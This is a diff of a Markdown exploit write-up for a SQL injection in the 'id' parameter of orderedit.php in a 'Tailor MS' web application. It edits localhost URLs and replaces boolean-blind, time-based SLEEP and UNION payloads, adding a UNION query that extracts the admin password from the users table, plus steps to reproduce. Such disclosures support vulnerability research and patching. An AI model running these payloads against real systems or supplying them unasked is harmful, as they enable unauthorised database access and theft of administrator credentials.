@@ -1,4 +1,4 @@
-# Exploit Title: Tailor MS – SQL Injection in orderedit.php (`http://localhost/tailor/orderedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in orderedit.php (`http://localhost:8000/orderedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +20,31 @@ A SQL Injection vulnerability exists in the `orderedit.php` endpoint of **Tailor
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/orderedit.php?id=1`
+- **URL:** `http://localhost:8000/orderedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `orderedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-  - **Payload:** `id=1' AND 6638=(SELECT (CASE WHEN (6638=6638) THEN 6638 ELSE (SELECT 6050 UNION SELECT 9283) END))-- -`
+  - **Payload:** `id=1' AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 1111 UNION SELECT 2222) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-  - **Payload:** `id=1' AND (SELECT 2386 FROM (SELECT(SLEEP(5)))XRhV)-- WplQ`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 10 columns
-  - **Payload:** 
-```
-id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178707871,0x64646d59645258546b5a4377756354757478425a4e627454546a645577444c664567744d5a72426e,0x716a706a71),NULL,NULL,NULL,NULL,NULL-- -
-```
+  - **Payload:** `id=1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))abcd)-- efgh`
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password
+  - **Payload:**  
+    ```
+    http://localhost:8000/orderedit.php?id=-1' union select 1,2,password,4,5,6,7,8,9,10 from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +64,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/orderedit.php?id=1`.  
+1. Browse to `http://localhost:8000/orderedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `orderedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +74,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
